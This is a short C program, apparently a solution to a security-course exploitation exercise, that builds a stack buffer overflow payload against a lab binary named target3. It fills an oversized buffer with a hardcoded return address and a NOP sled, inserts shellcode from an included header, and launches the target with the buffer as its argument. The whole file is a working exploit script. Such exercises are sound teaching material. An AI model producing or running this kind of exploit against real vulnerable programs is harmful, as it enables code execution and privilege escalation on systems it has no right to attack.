// (c) 2015 Tony Liu and Reid Pryzant
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include "shellcode.h"

#define DEFAULT_BUFFER_SIZE SHRT_MAX+4
#define CUTOFF              4000
#define NOP                 0x90
#define TGT_ADDRESS         0xBFFF6e70

//constructs the malicious buffer
char *make_buffer() {
  char *buff, *tmp;
  long *addr_ptr;
  int i;
  long addr = TGT_ADDRESS;

  buff = (char *)calloc(DEFAULT_BUFFER_SIZE,1);
  addr_ptr = (long *)buff;

  //addresses are 4 bytes (32 bits)
  for(i = 0; i<DEFAULT_BUFFER_SIZE/4; i++) {
    addr_ptr[i] = addr;
  }
  
  for(i = 0; i<CUTOFF/2; i++) {
    buff[i] = NOP;
  }

  //for enough room for shellcode
  tmp = buff + CUTOFF/2 - strlen(shellcode);
  
  for(i = 0; i < strlen(shellcode); i++) {
    tmp[i] = shellcode[i];
  }

  buff[DEFAULT_BUFFER_SIZE-1] = '\0';

  printf("%d\n", strlen(buff));
  return buff;
}

int main(int argc, char *argv[])
{
  char *args[3];
  char *env[1];
  char *target = (argc == 2) ? argv[1] : "/usr/local/bin/target3";

  args[0] = target; args[1] = make_buffer(); args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(target, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
